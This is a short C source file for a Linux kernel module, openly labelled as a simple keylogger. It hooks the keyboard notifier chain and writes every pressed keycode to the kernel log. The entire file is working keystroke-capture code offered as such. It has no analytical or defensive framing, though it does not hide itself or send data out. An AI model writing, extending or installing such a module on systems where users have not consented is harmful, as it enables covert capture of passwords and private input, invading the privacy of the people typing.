#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nurkanat");
MODULE_DESCRIPTION("A simple keylogger module");

struct notifier_block nb;

int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    if (code == KBD_KEYCODE && param->value != KEY_RESERVED) {
        printk(KERN_INFO "Key pressed: %d\n", param->value);
    }
    return NOTIFY_OK;
}

static int __init keylogger_init(void) {
    printk(KERN_INFO "Initializing keylogger module\n");
    nb.notifier_call = keylogger_notify;
    register_keyboard_notifier(&nb);
    return 0;
}

static void __exit keylogger_exit(void) {
    unregister_keyboard_notifier(&nb);
    printk(KERN_INFO "Exiting keylogger module\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

